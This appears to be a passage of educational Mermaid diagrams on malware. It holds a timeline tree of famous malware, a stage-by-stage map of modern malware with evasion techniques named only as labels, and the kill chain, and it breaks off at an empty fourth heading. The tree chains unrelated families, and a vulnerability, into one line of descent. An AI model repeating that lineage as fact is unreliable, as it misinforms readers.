The following Mermaid block renders a phylogenetic-style tree of major malware families, with alphanumeric node IDs and clean labels (no markdown inside labels).

```mermaid
graph TD
    node1["1971 Creeper Worm ARPANET Era"]
    node2["1986 Brain Boot Sector Virus"]
    node3["1988 Morris Worm First Internet Worm"]
    node4["1995 Concept Macro Virus Era"]
    node5["1999 Melissa Email Worm"]
    node6["2000 ILOVEYOU VBScript Worm"]
    node7["2001 Code Red IIS Buffer Overflow"]
    node8["2003 SQL Slammer Fastest Worm"]
    node9["2010 Stuxnet First Cyber Weapon"]
    node10["2013 CryptoLocker Ransomware"]
    node11["2016 Mirai IoT Botnet"]
    node12["2017 WannaCry Ransom Worm"]
    node13["2020 SUNBURST Supply Chain"]
    node14["2021 Log4Shell RCE Vulnerability"]
    node15["2024 AI LLM Augmented Malware"]
    node16["Modern Fileless Malware LOLBins"]
    node17["Polymorphic Engines"]
    node18["Metamorphic Engines"]

    node1 --> node2
    node2 --> node3
    node3 --> node4
    node4 --> node5
    node5 --> node6
    node6 --> node7
    node7 --> node8
    node8 --> node9
    node9 --> node10
    node10 --> node11
    node11 --> node12
    node12 --> node13
    node13 --> node14
    node14 --> node15
    node3 --> node17
    node17 --> node18
    node18 --> node16
    node16 --> node15
```

### Diagram 2: Block-Level Functional Architecture of Modern Malware

```mermaid
graph LR
    nodeA["Delivery Vector Phishing USB Supply Chain"]
    nodeB["Dropper / Stage 1 Loader"]
    nodeC["Stage 2 Payload Downloader"]
    nodeD["Persistence Module Registry Scheduled Task Service"]
    nodeE["Privilege Escalation UAC Bypass Token Theft"]
    nodeF["Defense Evasion AMSI Bypass ETW Patch Process Hollowing"]
    nodeG["Payload Module Ransomware RAT Banking Trojan Wiper"]
    nodeH["C2 Communication HTTPS DNS Tunneling Tor"]
    nodeI["Anti Forensics Log Wiper Timestomp Memory Only"]

    nodeA --> nodeB
    nodeB --> nodeC
    nodeC --> nodeD
    nodeD --> nodeE
    nodeE --> nodeF
    nodeF --> nodeG
    nodeG --> nodeH
    nodeG --> nodeI
```

### Diagram 3: Block Diagram of the Cyber Kill Chain (Lockheed Martin)

```mermaid
graph TD
    phase1["Phase 1 Reconnaissance"]
    phase2["Phase 2 Weaponization"]
    phase3["Phase 3 Delivery"]
    phase4["Phase 4 Exploitation"]
    phase5["Phase 5 Installation"]
    phase6["Phase 6 Command and Control"]
    phase7["Phase 7 Actions on Objectives"]

    phase1 --> phase2
    phase2 --> phase3
    phase3 --> phase4
    phase4 --> phase5
    phase5 --> phase6
    phase6 --> phase7
```

### Diagram 4: Ransomware Attack Lifecycle

